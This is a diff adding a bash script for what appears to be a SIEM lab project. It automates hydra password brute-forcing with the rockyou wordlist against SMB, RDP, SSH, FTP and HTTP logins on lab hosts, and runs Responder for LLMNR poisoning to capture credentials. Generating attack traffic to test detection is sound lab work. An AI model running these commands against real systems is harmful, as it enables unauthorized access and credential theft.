@@ -1,0 +1,125 @@
+#!/bin/bash
+
+# attack_simulation.sh
+# Script to automate brute-force attack simulations on target machines for SIEM Lab Project
+# Author: Gunel Salamova
+# Version: 1.0
+# Date: May 15, 2025
+
+# Configuration variables
+WORDLIST="/usr/share/wordlists/rockyou.txt"
+ATTACKER_IP="192.168.254.130"
+WINDOWS_TARGET_IP="192.168.254.150"
+KALI_TARGET_IP="192.168.254.140"
+WINDOWS_USER="Administrator"
+KALI_USER="kali"
+LOG_FILE="/var/log/attack_simulation.log"
+RESPONDER_CONF="/etc/responder/Responder.conf"
+
+# Function to log messages
+log() {
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
+}
+
+# Function to check if command was successful
+check_error() {
+    if [ $? -ne 0 ]; then
+        log "ERROR: $1"
+        exit 1
+    fi
+}
+
+# Check if script is run with sudo
+if [ "$EUID" -ne 0 ]; then
+    log "This script must be run as root (use sudo)"
+    exit 1
+fi
+
+# Create log file if it doesn't exist
+touch "$LOG_FILE"
+check_error "Failed to create log file"
+
+log "Starting attack simulation..."
+
+# Step 1: Verify dependencies (hydra, responder)
+log "Checking for required tools..."
+for tool in hydra responder; do
+    if ! command -v "$tool" &> /dev/null; then
+        log "ERROR: $tool is not installed"
+        exit 1
+    fi
+done
+
+# Step 2: Verify wordlist exists
+log "Checking for wordlist..."
+if [ ! -f "$WORDLIST" ]; then
+    log "ERROR: Wordlist not found at $WORDLIST"
+    exit 1
+fi
+
+# Step 3: Brute-force attacks on Windows 10 target
+log "Starting attacks on Windows 10 target (${WINDOWS_TARGET_IP})..."
+
+# SMB brute-force
+log "Performing SMB brute-force attack..."
+hydra -l "$WINDOWS_USER" -P "$WORDLIST" smb://"$WINDOWS_TARGET_IP" -t 4 > /tmp/smb_attack.log 2>&1
+check_error "SMB brute-force attack failed"
+
+# RDP brute-force
+log "Performing RDP brute-force attack..."
+hydra -l "$WINDOWS_USER" -P "$WORDLIST" rdp://"$WINDOWS_TARGET_IP" -t 4 > /tmp/rdp_attack.log 2>&1
+check_error "RDP brute-force attack failed"
+
+# SSH brute-force
+log "Performing SSH brute-force attack..."
+hydra -l "$WINDOWS_USER" -P "$WORDLIST" ssh://"$WINDOWS_TARGET_IP" -t 4 > /tmp/ssh_windows_attack.log 2>&1
+check_error "SSH brute-force attack failed"
+
+# Step 4: LLMNR attack using Responder
+log "Performing LLMNR attack using Responder..."
+# Ensure Responder is configured to listen on the correct interface
+if [ -f "$RESPONDER_CONF" ]; then
+    responder -I eth0 -wrf > /tmp/responder_attack.log 2>&1 &
+    RESPONDER_PID=$!
+    log "Responder started with PID $RESPONDER_PID"
+    sleep 60 # Run for 60 seconds to capture responses
+    kill "$RESPONDER_PID"
+    log "Responder stopped"
+else
+    log "ERROR: Responder configuration file not found at $RESPONDER_CONF"
+    exit 1
+fi
+
+# Step 5: Brute-force attacks on Kali Linux target
+log "Starting attacks on Kali Linux target (${KALI_TARGET_IP})..."
+
+# SSH brute-force
+log "Performing SSH brute-force attack..."
+hydra -l "$KALI_USER" -P "$WORDLIST" ssh://"$KALI_TARGET_IP" -t 4 > /tmp/ssh_kali_attack.log 2>&1
+check_error "SSH brute-force attack failed"
+
+# FTP brute-force
+log "Performing FTP brute-force attack..."
+hydra -l "$KALI_USER" -P "$WORDLIST" ftp://"$KALI_TARGET_IP" -t 4 > /tmp/ftp_attack.log 2>&1
+check_error "FTP brute-force attack failed"
+
+# HTTP GET brute-force
+log "Performing HTTP GET brute-force attack..."
+hydra -l "$KALI_USER" -P "$WORDLIST" http-get://"$KALI_TARGET_IP" -t 4 > /tmp/http_attack.log 2>&1
+check_error "HTTP GET brute-force attack failed"
+
+# Step 6: Clean up
+log "Cleaning up temporary files..."
+rm -f /tmp/*_attack.log
+check_error "Failed to clean up temporary files"
+
+# Step 7: Display completion message
+log "Attack simulation completed successfully!"
+echo "------------------------------------------------"
+echo "Attack Simulation Summary:"
+echo "Windows 10 Target: SMB, RDP, SSH, LLMNR attacks executed"
+echo "Kali Linux Target: SSH, FTP, HTTP GET attacks executed"
+echo "Logs: $LOG_FILE"
+echo "------------------------------------------------"
+
+exit 0
